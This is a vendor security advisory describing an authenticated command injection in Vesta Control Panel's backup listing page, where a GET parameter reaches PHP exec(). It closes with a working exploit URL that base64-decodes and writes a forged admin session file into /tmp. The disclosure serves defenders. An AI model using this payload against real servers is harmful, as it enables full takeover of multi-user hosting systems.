Advisory Details:

High-Tech Bridge Security Research Lab discovered critical vulnerability in Vesta Control Panel, which can be exploited to execute arbitrary system commands and gain complete access to the vulnerable system.

The vulnerability exists due to insufficient filtration of user-input passed via the "backup" HTTP GET parametre to "/list/backup/index.php" before using it in the PHP 'exec()' function. A remote authenticated attacker can inject arbitrary commands and execute them on the system with privileges of the default Vesta Control Panel "admin" account.

Successful exploitation of this vulnerability may allow an attacker to gain complete control over the Vesta Control Panel and use it to advance his privileges on the system, manage installed services, reconfigure firewall, etc. Since Vesta Control Panel is a multiuser control panel for hosting multiple websites, any registered client can use the described vulnerability to compromise the entire system.

A simple exploit below will create a PHP session file in "/tmp/" directory with administrative access to Vesta Control Panel:

https://192.168.189.133:8083/list/backup/index.php?backup=123%27%20||%20  echo 'V0VCX1NZU1RFTXxzOjc6ImFwYWNoZTIiO1dFQl9SR1JPVVBTfHM6ODoid3d3LWRhdGEiO1dFQl9QT1JUfHM6NDoiODA4MCI7V0VCX1NTTHxzOjc6Im1vZF9zc2wiO1dFQl9TU0xfUE9SVHxzOjQ6Ijg0NDMiO1BST1hZX1NZU1RFTXxzOjU6Im5naW54IjtQUk9YWV9QT1JUfHM6MjoiODAiO1BST1hZX1NTTF9QT1JUfHM6MzoiNDQzIjtGVFBfU1lTVEVNfHM6NjoidnNmdHBkIjtNQUlMX1NZU1RFTXxzOjU6ImV4aW00IjtJTUFQX1NZU1RFTXxzOjc6ImRvdmVjb3QiO0FOVElWSVJVU19TWVNURU18czowOiIiO0FOVElTUEFNX1NZU1RFTXxzOjA6IiI7REJfU1lTVEVNfHM6NToibXlzcWwiO0ROU19TWVNURU18czo1OiJiaW5kOSI7U1RBVFNfU1lTVEVNfHM6MTc6IndlYmFsaXplcixhd3N0YXRzIjtCQUNLVVBfU1lTVEVNfHM6NToibG9jYWwiO0NST05fU1lTVEVNfHM6NDoiY3JvbiI7RElTS19RVU9UQXxzOjI6Im5vIjtGSVJFV0FMTF9TWVNURU18czo4OiJpcHRhYmxlcyI7RklSRVdBTExfRVhURU5TSU9OfHM6ODoiZmFpbDJiYW4iO1JFUE9TSVRPUll8czo1OiJjbW1udCI7VkVSU0lPTnxzOjU6IjAuOS44IjtMQU5HVUFHRXxzOjI6ImVuIjtsYW5ndWFnZXxzOjI6ImVuIjt1c2VyfHM6NToiYWRtaW4iO2JhY2t8czoxMToiL2xpc3QvdXNlci8iOw==' | base64 --decode > /tmp/sess_12345%20||%20echo%20\
